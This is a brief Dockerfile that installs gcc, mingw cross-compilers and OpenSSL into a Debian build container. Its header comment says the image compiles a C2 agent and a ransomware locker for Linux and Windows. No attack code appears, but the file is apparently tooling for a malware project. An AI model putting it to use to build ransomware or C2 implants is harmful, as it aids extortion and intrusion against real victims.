# Unified Compiler — gcc (Linux) + mingw (Windows) + OpenSSL
# Compila tanto C2 agent (.exe) quanto Ransom locker (Linux + Windows)
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    gcc \
    g++ \
    g++-mingw-w64-x86-64 \
    binutils-mingw-w64-x86-64 \
    mingw-w64 \
    libssl-dev \
    openssl \
    make \
    file \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m -u 1000 builder
USER builder

WORKDIR /build
CMD ["/bin/bash"]
